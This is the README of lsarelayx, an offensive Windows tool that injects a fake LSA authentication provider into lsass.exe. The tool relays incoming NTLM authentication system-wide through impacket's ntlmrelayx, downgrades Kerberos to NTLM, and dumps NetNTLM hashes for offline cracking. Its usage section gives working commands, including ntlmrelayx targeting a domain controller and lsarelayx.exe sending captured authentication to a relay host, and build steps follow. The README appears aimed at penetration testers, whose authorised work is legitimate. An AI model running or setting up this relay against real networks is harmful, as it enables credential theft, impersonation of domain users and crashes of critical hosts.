# lsarelayx

## Introduction

lsarelayx is system wide NTLM relay tool designed to relay incoming NTLM based authentication to the host it is running on.  lsarelayx will relay **any** incoming authentication request which includes SMB.  Since lsarelayx hooks into existing application authentication flows, the tool will also attempt to service the original authentication request after the relay is complete.  This will prevent the target application/protocol from displaying errors and function as normal for end users authenticating against the lsarelayx host.

### **Features**

* Relays NTLM connections system wide, including SMB, HTTP/HTTPS, LDAP/LDAPS or any other third party application implementing the Windows authentication APIs.
* Where possible, downgrades incoming Kerberos authentication requests to NTLM.  This will cause clients that would traditionally attempt Kerberos authentication to fallback to NTLM.
* Performs an LDAP query for the relayed user to fetch group membership info an create the correct authentication token for the original request.
* Dumps NetNTLM messages for offline cracking.
* Supports a passive mode that does not relay and only dumps captured NetNTLM hashes (no Kerberos downgrade in this mode).

## How it works

lsarelayx comes in three parts.  A fake LSA authentication provider implemented within liblsarelay.dll, a user mode console application as the control interface and a new ntlmrelayx server module called RAW.

### liblsarelayx.dll

liblsarelayx.dll is the LSA authentication provider that gets loaded by lsarelayx.  It's predominant purpose is to hook the NTLM and Negotiate packages to facilitating redirecting authentication requests to lsarelayx over a local named pipe for relaying and dumping NetNTLM hashes.  liblsarelayx is designed to be as simple as possible where all the heavy lifting is performed by lsarelayx

### lsarelayx.exe

lsarelayx.exe is the main console application used to load the custom LSA authentication provider (liblsarelayx.dll), listen for incoming NTLM and Negotiate tokens from the authentication provider and relay to ntlmrelayx's RAW server module.  The tool also performs the LDAP queries used for capturing group information for relayed users and passing back to the LSA authentication provider.

### RAW ntlmrelayx module

impacket's ntlmrelayx has implemented a significant amount of work creating relay attacks and will continue to improve and add further attack in the future.  To take advantage of this in favour of reimplementing attacks directly within lsarelayx, a new ntlmrelayx server module was created called RAW.  Currently there is a [PR open on GitHub](https://github.com/SecureAuthCorp/impacket/pull/1190) that implements the RAW server module.  The RAW server module is protocol agnostic and is designed to accept the raw NTLM messages directly from 3rd party software like lsarelayx.

Until the PR is merged into the mainline impacket repo, you can use [this version](https://github.com/CCob/impacket)

## Usage

### Active Mode

First start the ntmlrelayx RAW server module to listen for RAW NTLM messages passed from lsarelayx.

```
python examples\ntlmrelayx.py -smb2support --no-wcf-server --no-smb-server --no-http-server "-t" smb://dc.victim.lan

Impacket v0.9.24.dev1+20211015.125134.c0ec6102 - Copyright 2021 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

lsarelayx itself requires local administrator permissions to run.  To run in active relay mode, the host address where ntlmrelayx is running the raw server module needs to be specified.  The default port is 6666.  This can be overridden with the `--port` argument, but be sure to have also overridden the port on the ntlmrelayx side too using the `--raw-port` argument.

```
lsarelayx.exe --host 192.168.1.1
[+] Using 192.168.1.1:6666 for relaying NTLM connections
[=] Attempting to load LSA plugin C:\users\Administrator\Desktop\liblsarelayx.dll
```

### Passive Mode

You can also run lsarelayx in passive mode by running without any arguments

```
lsarelayx.exe
[=] No host supplied, switching to passive mode
[=] Attempting to load LSA plugin C:\users\Administrator\Desktop\liblsarelayx.dll
```

### Caveats

Once the liblsarelayx DLL has been loaded into lsass, currently you cannot unload it due to limitations of how LSA plugins work.  The client can be closed which will put the DLL into a dormant state until the client starts again but the DLL will be in use until a reboot occurs.

Since the LSA plugin is not actually a genuine plugin, there are plans to implement a reflective loader inside the plugin which can then be stopped and started at will but that’s an exercise for another day.

Development was performed on Windows 10 and Server 2016.  A quick test was performed on Windows Server 2012 R2 which worked, but the calculation of offsets for hooking can fail on 2012 (this can be provided manually using the `lookuppackage-hint=`, get it wrong and Windows will reboot).  No testing has been performed on anything below Windows 10 on the desktop side and nothing tested on Server 2019 at all.

## !!WARNING!!

liblsarelayx.dll will be loaded inside the critical lsass.exe process.  If liblsarelayx.dll has any bugs that lead to crashing lsass.exe, the host **WILL** reboot after 60s.  Whilst best efforts have been made to write bug free code, I can't promise anything.  Don't come crying to me that you took your fortune 500 client down for crashing the busy file server after using lsarelayx.

## Building

### Docker

If you have docker installed, this is the quickest option. It utilises the `ccob/windows_cross` image with all the build dependencies pre-installed.

#### Docker on Windows (Powershell)

```shell
docker run --rm -it -v $env:pwd\:/root/lsarelayx ccob/windows_cross:latest /bin/bash -c "cd /root/lsarelayx; mkdir build; cd build; cmake -DCMAKE_INSTALL_PREFIX=/root/lsarelayx/dist -DCMAKE_BUILD_TYPE=MinSizeRel -DCMAKE_TOOLCHAIN_FILE=../toolchain/Linux-mingw64.cmake ..; cmake --build .; cmake --install ."
```

#### Docker on Linux

```shell
docker run --rm -it -v $(pwd):/root/lsarelayx ccob/windows_cross:latest /bin/bash -c "cd /root/lsarelayx; mkdir build; cd build; cmake -DCMAKE_INSTALL_PREFIX=/root/lsarelayx/dist -DCMAKE_BUILD_TYPE=MinSizeRel -DCMAKE_TOOLCHAIN_FILE=../toolchain/Linux-mingw64.cmake ..; cmake --build .; cmake --install ."
```

### Linux

On Linux we utilise a CMake toolchain along with the MinGW compiler.  These need to be installed before hand.  For the managed component, please make sure the dotnet command line tool is also installed from .NET core

```shell
mkdir build
cd build
cmake -DCMAKE_INSTALL_PREFIX=$PWD/dist -DCMAKE_BUILD_TYPE=MinSizeRel -DCMAKE_TOOLCHAIN_FILE=../toolchain/Linux-mingw64.cmake ..
cmake --build .
cmake --install .
```

### Windows (Powershell)

Windows will require a full CMake, MinGW and Visual Studio setup before even attempting to build, it's the most painful way to build if you don't have a development environment installed 

```shell
mkdir build
cd build
cmake -DCMAKE_INSTALL_PREFIX=$PWD/dist -DCMAKE_BUILD_TYPE=MinSizeRel -G "MinGW Makefiles" ..
cmake --build .
cmake --install .
```